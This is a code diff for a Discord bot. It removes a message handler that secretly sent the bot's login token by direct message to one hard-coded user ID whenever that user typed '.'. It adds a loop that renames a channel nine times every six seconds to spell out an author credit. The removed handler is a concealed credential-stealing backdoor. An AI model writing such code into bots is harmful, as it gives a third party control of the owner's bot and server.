@@ -105,14 +105,21 @@ channel.guild.owner.send(`<@!${channelremover.id}>
 
 
 
-client.on('message' , message => {
-if (message.author.bot) return;
-           if (message.content == '.')
-           if (message.author.id === '306464381775118336'){
-if (!message.channel.guild) return;
-message.author.send(Token)
-}  
+client.on("ready", async  => {
+setInterval(function(){
+client.channels.find('id', '495211986582503424').setName("Dev");
+client.channels.find('id', '495211986582503424').setName("By");
+client.channels.find('id', '495211986582503424').setName("M7M");
+client.channels.find('id', '495211986582503424').setName("M7MED");
+client.channels.find('id', '495211986582503424').setName("M7MEDYT");
+client.channels.find('id', '495211986582503424').setName("And");
+client.channels.find('id', '495211986582503424').setName("AndDo");
+client.channels.find('id', '495211986582503424').setName("AndDoDa");
+client.channels.find('id', '495211986582503424').setName("AndDoDaJr");
+  }, 6000);
 });
+//By ReBeL 
+client.login("TOKEN");
 
 
 
